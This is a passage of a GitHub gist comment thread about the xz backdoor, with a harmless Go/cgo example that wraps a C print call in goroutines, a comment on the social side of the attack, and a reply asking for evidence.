src="https://private-user-images.githubusercontent.com/5059144/322214734-2474085d-bff5-4ff7-94c5-d56c29c0d5d0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDczNC0yNDc0MDg1ZC1iZmY1LTRmZjctOTRjNS1kNTZjMjljMGQ1ZDAucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9NmExZTQ4ODgxYWVlMGNjODQwNTYwNTk0ZmY2ZDg5NjQ1ZmY1OWVlODk4MzhkOWQ2ZDkyY2U3ZWY1YmM5NTBkMyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.9dA5mNX0pGxhVKcNA97fMuJ6U2-k3xJaZpe33agIvqI" alt="image" style="max-width: 100%;"></a><br>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/5059144/322214784-7d128f46-5747-4faf-9ef1-3c9c732ddb21.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDc4NC03ZDEyOGY0Ni01NzQ3LTRmYWYtOWVmMS0zYzljNzMyZGRiMjEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OTYzZDA1OTZiNWY4MDNmYjFjNDY1Zjc0OTg3MjE1ZDVhOGNmYTRjNGRlMzA3ZjU5MGM3ZDRjZGE5ODRkYzk0NCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.24CBjaAtRp38HMBdnUE245a1zPQDWkYQCS3dt-QExPM"><img src="https://private-user-images.githubusercontent.com/5059144/322214784-7d128f46-5747-4faf-9ef1-3c9c732ddb21.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDc4NC03ZDEyOGY0Ni01NzQ3LTRmYWYtOWVmMS0zYzljNzMyZGRiMjEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OTYzZDA1OTZiNWY4MDNmYjFjNDY1Zjc0OTg3MjE1ZDVhOGNmYTRjNGRlMzA3ZjU5MGM3ZDRjZGE5ODRkYzk0NCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.24CBjaAtRp38HMBdnUE245a1zPQDWkYQCS3dt-QExPM" alt="image" style="max-width: 100%;"></a></p>
<p dir="auto">Notice how nice and compact the goroutine is!    Not many things you can do here but try to intercept the <code class="notranslate">ret</code> and <code class="notranslate">call</code> instructions, but you will need to also make sure the runtime stack cleanup happens or things will start to go crashycrashy.</p>
<p dir="auto">So now let's make a C lib call but push it down into a goroutine wrapper, yet make it synchronous.   And for fun, the data to the function will be passed via a channel, which brings in the communication/sync areas of the runtime with its maze of runtime functions.   And since we're here, let's make it a full Go wrapper, with two channels and a goroutine bridge, and a done signaler.</p>
<pre class="notranslate"><code class="notranslate">package main

// #include &lt;stdio.h&gt;
// #include &lt;stdlib.h&gt;
// void printFromC(const char* str) {
//     printf("Received C string: %s\n", str);
// }
import "C"
import "unsafe"

func main() {
	myPrint("Hello from Go!")
}

func myPrint(hellostring string) {
	// Protect the C library call from Jia Tan and the NSA
	sendchan := make(chan string)
	recvchan := make(chan string)
	done := make(chan bool)
	
	go func(sender chan string, receiver chan string){ // This chan is send-only
		go func(receive &lt;-chan string) { // This one is recv-only
			callCPrint(receive)
			done &lt;- true
		}(receiver)
		go func() {
			strToSend := &lt;- sender
			receiver &lt;- strToSend
			close(sender)
			return
		}()
	}(sendchan, recvchan)

	sendchan &lt;- hellostring
	&lt;-done
	return
}

func callCPrint(str &lt;-chan string) {
	cStr := C.CString(&lt;-str)
	defer C.free(unsafe.Pointer(cStr)) // Deallocate memory when done
	C.printFromC(cStr)
}
</code></pre>
<p dir="auto">The <code class="notranslate">main()</code> in asm representation gets shorter<br>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/5059144/322218981-3e0249a4-2999-4635-ad7f-13b0994122d9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxODk4MS0zZTAyNDlhNC0yOTk5LTQ2MzUtYWQ3Zi0xM2IwOTk0MTIyZDkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YjkwMzM4ZWM2MDlhMWE3OWUyYTg0NjFkNDMwYmM4OWY2ODQ1MTM1MjQ4NDNhYzliMTM2NmQ5YTAzN2RkNGNkMSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.gEjuTovTf26dKliUa8aTuZg4UrECcaFb3ywiBblxc4Q"><img src="https://private-user-images.githubusercontent.com/5059144/322218981-3e0249a4-2999-4635-ad7f-13b0994122d9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxODk4MS0zZTAyNDlhNC0yOTk5LTQ2MzUtYWQ3Zi0xM2IwOTk0MTIyZDkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YjkwMzM4ZWM2MDlhMWE3OWUyYTg0NjFkNDMwYmM4OWY2ODQ1MTM1MjQ4NDNhYzliMTM2NmQ5YTAzN2RkNGNkMSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.gEjuTovTf26dKliUa8aTuZg4UrECcaFb3ywiBblxc4Q" alt="image" style="max-width: 100%;"></a></p>
<p dir="auto">But now there is some real fun going on in <code class="notranslate">myPrint()</code> as it's acting as a traffic cop moving the string along its way into the chaos of <code class="notranslate">pthread</code>, with its context switches and semaphores.  <code class="notranslate">myPrint</code> is split by the compiler into 6 asm functions (one each for the launch point and anonymous function of the three goroutines) to allow for their dynamic reallocation to the runtime.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/5059144/322219046-7c812676-9ee7-4904-b2bc-76fedff5d7b9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxOTA0Ni03YzgxMjY3Ni05ZWU3LTQ5MDQtYjJiYy03NmZlZGZmNWQ3YjkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YjJjMjFhZGQyNDVlNDE2YTVlMjRkOTAyZThlNGUyYmQ3MzFiMjc2YTlmODI4MjM3NWEzMTk3MDQ3YTIzNTg1ZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.TVDskdNZew7tYd8cLzLuW_5cNfslSRrxnIkN5zHYxvQ"><img src="https://private-user-images.githubusercontent.com/5059144/322219046-7c812676-9ee7-4904-b2bc-76fedff5d7b9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxOTA0Ni03YzgxMjY3Ni05ZWU3LTQ5MDQtYjJiYy03NmZlZGZmNWQ3YjkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YjJjMjFhZGQyNDVlNDE2YTVlMjRkOTAyZThlNGUyYmQ3MzFiMjc2YTlmODI4MjM3NWEzMTk3MDQ3YTIzNTg1ZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.TVDskdNZew7tYd8cLzLuW_5cNfslSRrxnIkN5zHYxvQ" alt="image" style="max-width: 100%;"></a><br>
That goes on for pages.</p>
<p dir="auto"><code class="notranslate">callCPrint</code> then has a thunk going on, which can't get back its data to <code class="notranslate">myPrint</code> without going back through the runtime maze.<br>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/5059144/322219294-0d0538ba-7a80-4a3b-9cbb-5b2c1075be9d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxOTI5NC0wZDA1MzhiYS03YTgwLTRhM2ItOWNiYi01YjJjMTA3NWJlOWQucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZWQxOTViMDJlNTBiZmI1NmZlZDMwNmM0YjRiNjI5ZmEwZTYxOTQ1ZWYzZjYwMDM3YTJkNjg1MzU0NDFjNDNiMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.hSbHEcHQuGvLqJztmvXRRtM-6TuGGr3rzjTQszo4nAA"><img src="https://private-user-images.githubusercontent.com/5059144/322219294-0d0538ba-7a80-4a3b-9cbb-5b2c1075be9d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxOTI5NC0wZDA1MzhiYS03YTgwLTRhM2ItOWNiYi01YjJjMTA3NWJlOWQucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZWQxOTViMDJlNTBiZmI1NmZlZDMwNmM0YjRiNjI5ZmEwZTYxOTQ1ZWYzZjYwMDM3YTJkNjg1MzU0NDFjNDNiMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.hSbHEcHQuGvLqJztmvXRRtM-6TuGGr3rzjTQszo4nAA" alt="image" style="max-width: 100%;"></a></p>
<p dir="auto">I'm still not sold on this approach but I'm definitely willing to change my own behavior to make these creeps go away if the difficulty is raised high enough.   And throwing CGo calls through a goroutine bridge still makes readable code to me.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022356" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="fdwTAOPltUIvXxX0XFTvP6zn8qUQOuXJQliBNPqhte0qUjjCJVManQKAHlirpKCA6aLBmtXdkiyJQA4-f_3mdw" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022356/edit_form?textarea_id=gistcomment-5022356-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/tdkuehnel/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/tdkuehnel"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/3473688?s=80&amp;v=4" width="40" height="40" alt="@tdkuehnel" /></a>
    </div>
    <div id="gistcomment-5022496" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5022496-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/tdkuehnel/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/tdkuehnel">tdkuehnel</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022496#gistcomment-5022496" id="gistcomment-5022496-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-13T20:47:12Z" class="no-wrap">Apr 13, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto">Beside the technical things involved around this incident, which required profound knowledge and ability to develop and implement such an attack, the weak point and what was easy to establish was the social factor of the attack. It took only two persons working together to nudge the project maintainer out of the way. THAT is the real catastrophy.</p>
<p dir="auto">We need to use the internet to represent our real social connections, not to throw the whole world into one community driven by some huge content aggregators. The real power of the internet is still hidden in its decentralized inherent structure, which we are using and taking benefit of only in small amounts today.</p>
<p dir="auto">Yes, client-server brought the whole internet thing up to live, but now we are adult enough to decide for our own with whom to share and connect directly and how to decide who has access to which part of my own data. My comments are my data, every content i create is my data, it has to be distributed by the network of the poeple i know and trust, by their devices. Not by content aggregators. When i watch a yt video or other content, i want to see the comments of my friends and social contacts first, access the comments from their data stores directly. Better let me decide and configure which comments to see at all, not let it be dictated by some content aggregators which are deadstuck in their own development. The whole internet has to be shaped around our social contacts and networks, not be dictated by some content aggrgators. /rant off.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022496" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="IDuvrbWoOUihRjtHR3S0HTvFZbfYmj7xQaMohDR-7_TJTGqEREWYc0L8c1B5Tliq6quqljsGFto10EJmmQiBNA" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022496/edit_form?textarea_id=gistcomment-5022496-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/cwegener/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/cwegener"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/2950544?s=80&amp;v=4" width="40" height="40" alt="@cwegener" /></a>
    </div>
    <div id="gistcomment-5022645" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5022645-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/cwegener/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/cwegener">cwegener</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022645#gistcomment-5022645" id="gistcomment-5022645-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-14T02:57:30Z" class="no-wrap">Apr 14, 2024</relative-time></a>

        via email <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-mail">
    <path d="M1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25v-8.5C0 2.784.784 2 1.75 2ZM1.5 12.251c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V5.809L8.38 9.397a.75.75 0 0 1-.76 0L1.5 5.809v6.442Zm13-8.181v-.32a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25v.32L8 7.88Z"></path>
</svg>

      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block email-format">
      <div class="email-quoted-reply">On Sun, 14 Apr 2024 at 06:47, Torsten Kuehnel wrote:
 <a class="user-mention" href="https://github.com/tdkuehnel">@tdkuehnel</a> commented on this gist:

 It took only two persons working together to nudge the project
 maintainer out of the way.</div>
<div class="email-fragment">Is this your conclusion or is this statement some new development that
has happened that we have missed? Can you please elaborate.</div>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022645" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="LLS2EkUUb0nn_5rOSCm0a6YZyUo17J9zhmvcscq18LB7CUbLtjYLRGlop-KDz3vBOKbPYZUvogbaiQoQIIl6Qw" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022645/edit_form?textarea_id=gistcomment-5022645-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/avbentem/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/avbentem"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/1497002?s=80&amp;v=4" width="40" height="40" alt="@avbentem" /></a>
    </div>
    <div id="gistcomment-5022865" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
